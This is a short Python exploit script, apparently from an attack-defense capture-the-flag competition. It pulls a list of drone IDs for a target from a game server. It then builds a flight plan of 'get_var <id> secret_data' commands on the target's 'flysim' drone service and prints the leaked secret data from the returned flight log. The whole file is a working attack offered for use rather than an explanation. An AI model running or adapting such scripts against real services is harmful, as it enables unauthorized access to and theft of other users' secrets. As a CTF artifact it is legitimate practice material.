#!/usr/bin/env python3

import requests
import sys
import drone_client
import time
import json

IP = sys.argv[1]
drone_ids = requests.get("http://10.10.10.10/api/client/attack_data/").json()["flysim"][
    IP
]
fp = "\n".join([f"0 get_var {d} secret_data" for d in drone_ids])

client = drone_client.DroneClient(ip=IP)
client.create_drone(label="qweqwe11", secret_data="qweqwe", flight_plan=fp)
client.connect_to_drone()

drone_obj_with_secret = client.wait_for_data_msg(timeout=30)
print(drone_obj_with_secret["flight_log"], flush=True)
drone_obj_with_secret = client.wait_for_data_msg(timeout=30)
print(drone_obj_with_secret["flight_log"], flush=True)
